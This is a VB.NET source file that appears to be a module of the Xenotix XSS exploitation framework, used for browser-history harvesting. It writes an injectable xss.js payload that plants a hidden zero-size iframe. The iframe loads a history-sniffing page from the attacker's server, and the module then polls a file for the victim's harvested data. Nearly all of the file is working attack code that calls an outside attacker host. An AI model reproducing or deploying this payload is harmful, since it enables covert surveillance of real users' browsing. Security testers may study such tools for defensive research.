Imports System.IO

Public Class xss_info_sites_visited
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        On Error Resume Next
        Dim q As String = """"
        Dim ran = New Random()
        Dim tmp = ran.Next(150, 300)

        Dim w As New IO.StreamWriter(Application.StartupPath & "\browser_history.html")
        w.Write(TextBox1.Text.Replace("XSERVERX", xss_server.server_ip))
        w.Close()

        Dim streamx As New IO.StreamWriter(Application.StartupPath & "\xss.js")
        streamx.WriteLine("if (document.getElementById('xenotix_meta" & Str(tmp) & "') == null){ ")
        streamx.WriteLine("var ifm=document.createElement('iframe');")
        streamx.WriteLine("ifm.setAttribute(" & q & "src" & q & "," & q & "http://" & xss_server.server_ip & "/browser_history.html" & q & "); ifm.width=0; ifm.height=0;")
        streamx.WriteLine("document.body.appendChild(ifm);")
        streamx.WriteLine("script = document.createElement('script');script.id = 'xenotix_meta" & Str(tmp) & "'; document.body.appendChild(script); }")

        streamx.Close()
        Button1.Enabled = False
        Timer1.Enabled = True
        MsgBox("This may take a while. Please Wait....", vbInformation)

    End Sub

    Private Sub xss_info_sites_visited_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        On Error Resume Next
        IO.File.Delete("browser_history.html")
        IO.File.Delete("browser.txt")
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        On Error Resume Next
        IO.File.Delete("xss.js")
        IO.File.Delete("browser_history.html")
        IO.File.Delete("browser.txt")
        Me.Close()
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        On Error Resume Next
        Dim line As String = ""
        Dim readfile As System.IO.TextReader = New StreamReader(Application.StartupPath & "\browser.txt")
        line = readfile.ReadToEnd()
        If Not line = "" Then
            TextBox2.Text = line

            Timer1.Enabled = False
        End If
        readfile.Close()
        readfile = Nothing
    End Sub
End Class